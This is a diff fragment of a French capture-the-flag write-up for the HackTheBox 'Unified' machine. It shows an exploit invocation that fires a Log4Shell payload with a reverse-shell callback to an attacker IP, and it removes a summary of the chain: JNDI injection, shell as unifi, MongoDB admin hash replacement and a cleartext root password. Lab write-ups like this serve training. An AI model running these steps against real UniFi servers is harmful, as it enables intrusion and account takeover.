@@ -1,4 +1,4 @@
-# Write-up — HackTheBox : Unified
+# Write-up -- HackTheBox : Unified
 
 Write-up réalisé pour la machine Unified de HackTheBox. L'objectif est d'exploiter Log4Shell sur une instance vulnérable de UniFi Network, puis de manipuler directement la base de données MongoDB pour modifier le mot de passe admin et récupérer les credentials root stockés en clair dans l'interface.
 
@@ -110,24 +110,6 @@ python3 exploit.py -u https://10.129.90.61:8443 -i 10.10.15.30 -p 4444
 [*] Firing payload!
 [*] Check for a callback!
 ```
----
-
-## Résumé
-
-La chaîne d'exploitation complète :
-
-1. **Scan nmap** → 4 ports ouverts dont UniFi Network sur le 8443
-2. **Identification de la version** → UniFi 6.4.54 visible sur la page de login
-3. **CVE-2021-44228 (Log4Shell)** → RCE via injection JNDI/LDAP dans le champ username
-4. **Exploit Log4jUnifi** → reverse shell en tant que `unifi`
-5. **`ps -aux`** → MongoDB détecté sur le port 27117
-6. **`mongo --port 27117`** → connexion à la base `ace`
-7. **`db.admin.find()`** → hash du mot de passe admin récupéré
-8. **`db.admin.update()`** → hash remplacé par un hash contrôlé, accès à l'interface UniFi débloqué
-9. **Interface UniFi** → mot de passe root stocké en clair dans les paramètres (`NotACrackablePassword4U2022`)
-10. **SSH root** → flag root récupéré
-
-Les vulnérabilités principales sont **Log4Shell** (CVE-2021-44228), une faille de portée mondiale qui illustre le danger d'interpréter des entrées utilisateur dans un système de logging, et une **mauvaise gestion des secrets** : le mot de 
 
 La connexion arrive sur le listener. On cherche ensuite sur quel port tourne MongoDB :
 
